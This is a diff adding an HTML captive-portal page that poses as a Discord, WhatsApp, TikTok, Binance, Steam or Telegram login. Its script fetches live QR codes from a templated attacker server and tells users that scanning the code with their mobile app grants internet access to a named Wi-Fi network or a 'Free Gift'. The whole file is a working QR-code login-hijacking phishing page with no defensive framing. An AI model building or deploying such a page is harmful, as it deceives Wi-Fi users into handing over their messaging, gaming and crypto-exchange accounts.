@@ -1,0 +1,190 @@
+<html>
+
+<head>
+    <title>Discord | Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #5d66f6;
+            color: #b4b6ba;
+            font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        h3 {
+            color: #fff;
+            font-size: 2em;
+            font-weight: 900;
+        }
+
+        .container {
+            width: 100%;
+            padding: 32px 32px;
+        }
+
+        #box {
+            width: 260px;
+            /*height: 340px;*/
+            background-color: #36393f;
+            border-radius: 10px;
+            padding: 64px;
+            margin: auto;
+            filter: drop-shadow(4px 4px 8px black);
+        }
+
+        .qr-box {
+            margin: auto;
+        }
+
+        .qr-message {
+            text-align: center;
+        }
+
+        .box-message {
+            line-height: 20px;
+            margin-bottom: 24px;
+        }
+
+        #qrCode {
+            margin: auto;
+            padding: 12px;
+            background-color: #fff;
+            border-radius: 16px;
+            max-width: 180px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div id="box">
+            <div class="qr-box">
+                <img id="qrCode" alt="Scan me!" style="display: none;">
+            </div>
+            <div class="qr-message">
+                <div class="box-heading">
+                    <h3 id="title">Scan QR Code</h3>
+                </div>
+                <div id="message" class="box-message">Scan this with the <strong>mobile app</strong> to get <strong>instant
+                        rewards</strong>.
+                </div>
+                <div id="guide"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+        const API_URL = "http://{{ server_address }}:{{server_port}}";
+        const QRCODE_ID = "11111111-1111-1111-1111-111111111111";
+
+        function updatePage(host) {
+            console.log("update: " + host);
+            switch (host) {
+                case "web.whatsapp.com":
+                    document.querySelector("body").style.backgroundColor = "#00a884";
+                    document.querySelector("body").style.color = "#b4b6ba";
+                    document.querySelector("h3").style.color = "#fff";
+                    document.querySelector("#box").style.backgroundColor = "#36393f";
+                    document.querySelector("#title").innerHTML = "Join to {{ap_name}}";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Whatsapp</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Linked devices</strong> > <strong>Link a device</strong> ]";
+                    break;
+                case "discord.com":
+                    document.querySelector("body").style.backgroundColor = "#5d66f6";
+                    document.querySelector("body").style.color = "#b4b6ba";
+                    document.querySelector("h3").style.color = "#fff";
+                    document.querySelector("#box").style.backgroundColor = "#36393f";
+                    document.querySelector("#title").innerHTML = "Join to {{ap_name}}";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Discord</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    break;
+                case "www.tiktok.com":
+                    document.querySelector("body").style.backgroundColor = "#ef2a50";
+                    document.querySelector("body").style.color = "#000";
+                    document.querySelector("h3").style.color = "#000";
+                    document.querySelector("#box").style.backgroundColor = "#fff";
+                    document.querySelector("#title").innerHTML = "Join to {{ap_name}}";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>TikTok</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    break;
+                case "accounts.binance.com":
+                    document.querySelector("body").style.backgroundColor = "#fcd949";
+                    document.querySelector("body").style.color = "#000";
+                    document.querySelector("h3").style.color = "#000";
+                    document.querySelector("#box").style.backgroundColor = "#fff";
+                    document.querySelector("#title").innerHTML = "Join to {{ap_name}}";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Binance</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    break;
+                case "store.steampowered.com":
+                    document.querySelector("body").style.backgroundColor = "#181a21";
+                    document.querySelector("body").style.color = "#b4b6ba";
+                    document.querySelector("h3").style.color = "#fff";
+                    document.querySelector("#box").style.backgroundColor = "#36393f";
+                    document.querySelector("#title").innerHTML = "Free Gift";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Steam</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ Open <strong>Steam Guard</strong> ]";
+                    break;
+                case "web.telegram.org":
+                    document.querySelector("body").style.backgroundColor = "#8775e4";
+                    document.querySelector("body").style.color = "#b4b6ba";
+                    document.querySelector("h3").style.color = "#fff";
+                    document.querySelector("#box").style.backgroundColor = "#212121";
+                    document.querySelector("#title").innerHTML = "Join Channel";
+                    document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Telegram</strong> application to give <strong>Internet Connection</strong>.";
+                    document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Settings</strong> > <strong>Devices</strong> > <strong>Link Desktop Device</strong> ]";
+            }
+        }
+
+        function updateQR(t) {
+            var url = API_URL + "/qrcode/" + QRCODE_ID;
+            if (t > 0) {
+                url += "?t=" + t;
+            }
+            console.log("fetching: " + url);
+            fetch(url, {
+                method: "GET",
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+                .then((response) => {
+
+                    if (response.status == 200) {
+                        return response.json();
+                    } else if (response.status == 408) {
+                        console.log("timed out");
+                        updateQR(t);
+                    } else {
+                        throw "http error: " + response.status;
+                        //return response.error("http error");
+                        //setTimeout(function () { updateQR(t) }, 10000);
+                    }
+                })
+                .then((data) => {
+                    if (data !== undefined) {
+                        console.log("api: success:", data);
+
+                        var o = document.getElementById("qrCode");
+                        if (o != null) {
+                            o.src = data.source;
+                            o.style = "display: block";
+                        }
+                        updatePage(data.host);
+                        updateQR(data.update_time);
+                    }
+                })
+                .catch((error) => {
+                    console.error("api: error:", error);
+                    setTimeout(function () { updateQR(t) }, 10000);
+                });
+        }
+        updateQR(0);
+
+    </script>
+</body>
+
+</html>
